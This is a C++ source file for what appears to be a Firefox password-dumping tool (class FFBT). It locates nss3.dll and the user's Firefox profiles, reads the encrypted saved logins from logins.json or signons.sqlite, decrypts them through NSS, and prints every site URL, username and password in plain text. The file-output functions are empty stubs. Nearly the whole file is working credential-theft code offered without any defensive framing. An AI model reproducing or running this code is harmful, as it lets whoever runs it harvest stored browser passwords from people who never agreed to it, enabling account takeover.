#include "ffbt.hxx"

std::filesystem::path get_nss_location()
{
    std::cout << "\nSearching for nss3.dll...\n";
    std::vector<std::string> mozilla_dirs {
        "Mozilla Firefox", "Firefox Developer Edition",
        "Nightly", "Mozilla Thunderbird",
        "SeaMonkey", "Waterfox"
    };

    wil::unique_cotaskmem_string local_appdata_path;
    SHGetKnownFolderPath(FOLDERID_LocalAppData, KF_FLAG_DONT_UNEXPAND, NULL, &local_appdata_path);;
    
    std::filesystem::path local_path = local_appdata_path.get(),
                          root_path = "C:\\Program Files";

    for (auto dir : mozilla_dirs)
    {
        if (std::filesystem::exists(local_path / dir / "nss3.dll")) {
            std::cout << "[+] NSS found in " << (local_path / dir).string() << "\n\n";
            return local_path / dir;
        }
        else if (std::filesystem::exists(root_path / dir / "nss3.dll")) {
            std::cout << "[+] NSS found in " << (root_path / dir).string() << "\n\n";
            return root_path / dir;
        }
    }
    std::cerr << "[-] Could not find NSS :( Exiting...\n\n";
    exit(EXIT_FAILURE);
}


std::vector<std::filesystem::path> get_valid_profiles()
{
    std::cout << "Searching for Profiles...\n";
    // C:/Users/{USER}/AppData/Roaming/Mozilla/Firefox/
    wil::unique_cotaskmem_string roaming_appdata_path;
    SHGetKnownFolderPath(FOLDERID_RoamingAppData, KF_FLAG_DONT_UNEXPAND, NULL, &roaming_appdata_path);
    std::filesystem::path prof_path = roaming_appdata_path.get();
    prof_path =  prof_path / "Mozilla" / "Firefox" / "Profiles";

    // could read profiles.ini or just check each dir in Profiles folder.
    // check for signon.sqlite or login.json
    // add profile to vector if valid
    std::vector<std::filesystem::path> valid_profile_list;
    for (const auto & entry : std::filesystem::directory_iterator(prof_path)) {
        std::cout << "Profile found: " << entry.path() << "\n";
        if (std::filesystem::exists(entry.path() / "logins.json") ||
            std::filesystem::exists(entry.path() / "signons.sqlite"))
        {
            std::cout << "[+] Valid Profile\n";
            valid_profile_list.push_back(entry.path());
        }
        else
        {
            std::cout << "[-] Bad Profile\n";
        }
    }
    if (valid_profile_list.empty()) {
        std::cerr << "Could not find a valid profile... Exiting\n";
        exit(EXIT_FAILURE);
    }
    return valid_profile_list;
}


bool FFBT::retrieve_credentials(std::filesystem::path profile_path, int output_type)
{
    // instead do if exists logins.json & signons.sqlite. these try catch are annoying
    std::vector<std::vector<std::string>> encrypted_creds;
    try {
        // check if file exists then throw if not
        encrypted_creds = get_json_credentials(profile_path / "logins.json");
        if (encrypted_creds.empty()) {
            std::cerr << "logins.json exists but is empty or something really fucked up\n";
            return false; // throw to catch
        }
    }
    catch (const nlohmann::json::exception & e) {
        std::cerr << "Error reading logins.json, checking for sqlite database\nError: " << e.what() << std::endl;
        try {
            encrypted_creds = get_sqlite_credentials(profile_path / "signons.sqlite");
            if (encrypted_creds.empty()) {
                std::cerr << "signons.sqlite exists but is empty or something really fucked up\n";
                std::cerr << "Could not retrieve any credentials\n";
                return false;
            }
        }
        catch (...) { // TODO: specific exception
            std::cerr << "Could not retrieve any credentials\n";
            return false;
        }
    }
    //std::cout << "Successfully retrieved credentials\n";
    std::cout << "\n=========== ENCRYPTED ===========\n";
    for (auto& login : encrypted_creds) {
        std::cout << "Hostname: " << login[0] << std::endl;
        std::cout << "Encrypted username: " << login[1] << std::endl;
        std::cout << "Encrypted password: " << login[2] << std::endl;
        std::cout << "Encryption type: " << login[3] << std::endl;
    }

    std::vector<std::vector<std::string>> decrypted_creds = decrypt_credentials(encrypted_creds);
    if (output_type == 1 || output_type == 2) {
        if (output_credentials(decrypted_creds, output_type) == 1) {
            std::cerr << "Unable to output credentials fo type '" << output_type << "'\n";
        }
    }
    return true;
}


std::vector<std::vector<std::string>> FFBT::get_json_credentials(std::filesystem::path logins_path)
{
    std::ifstream login_file(logins_path.string());
    using json = nlohmann::json;
    json data = json::parse(login_file);
    
    std::vector<std::vector<std::string>> out;
    std::vector<std::string> LD;

    for (auto &login : data["logins"])
    {
        LD.push_back(login["hostname"]);
        LD.push_back(login["encryptedUsername"]);
        LD.push_back(login["encryptedPassword"]);
        LD.push_back(std::to_string((int)login["encType"]));

        out.push_back(LD);
        LD.clear();
    }
    return out;
}

std::vector<std::vector<std::string>> FFBT::get_sqlite_credentials(std::filesystem::path signons_path)
{
    std::vector<std::vector<std::string>> out;
    std::vector<std::string> LD;
    sqlite3* db; sqlite3_stmt* statement;

    if (sqlite3_open(signons_path.string().c_str(), &db) != SQLITE_OK) {
        std::cerr << "Could not open database\n";
        return out;
    }
    if (sqlite3_prepare_v2(db, "SELECT hostname, encryptedUsername, encryptedPassword, encType FROM moz_logins", -1, &statement, NULL) != SQLITE_OK) {
        std::cerr << "Error with SQL statement\n";
        return out;
    }

    int sql_ret = 0;
    int ncols = sqlite3_column_count(statement);
    while ((sql_ret = sqlite3_step(statement)) == SQLITE_ROW)
    {
        for (int i = 0; i < 4; i++)
        {
            LD.push_back(std::string(reinterpret_cast<const char*>(sqlite3_column_text(statement, i))));
        }
        out.push_back(LD);
        LD.clear();
    }
    if (sql_ret != SQLITE_DONE) {
        std::cerr << "error performing sql query: " << sqlite3_errmsg(db) << "\n";
        std::cerr << "ret: " << sql_ret << "\n";
        std::cerr << "returning vector anyway\n\n";
    }
    return out;
}

std::vector<std::vector<std::string>> FFBT::decrypt_credentials(std::vector<std::vector<std::string>> encrypted_creds)
{
    std::vector<std::vector<std::string>> out;
    std::vector<std::string> data;

    for (auto &site_e : encrypted_creds)
    {
        //site_d++;
        data.push_back(site_e[0]);
        if (std::stoi(site_e[3])) { // if it has encryption
            try {
                data.push_back(Decrypt(site_e[1]));
                data.push_back(Decrypt(site_e[2]));
            }
            catch (const std::exception& e) {
                std::cerr << "Decryption failed for '" << site_e[0] << "' with Error: " << e.what() << "\n";
                //++site_d;
                continue;
            }
        }
        else {
            //std::cout << "[+] Username and Password are not encrypted\n";
            data.push_back(site_e[1]);
            data.push_back(site_e[2]);
        }
        out.push_back(data);
        data.clear();
    }
    std::cout << "\n\n=========== DECRYPTED ===========\n";
    for (auto &site : out)
    {
        std::cout << "url: " << site[0] << "\n"
             << "username: " << site[1] << "\n"
             << "password: " << site[2] << "\n\n";
    }
    return out;
}

bool FFBT::output_credentials(std::vector<std::vector<std::string>> decrypted_creds, int output_type)
{
    if (output_type == 1) {
        //trycatch
        //txt file
    }
    else if (output_type == 2) {
        //trycatch
        //json file
    }
    else {
        // not a valid output option, outputting as txt
        return false;
    }
    return true;
}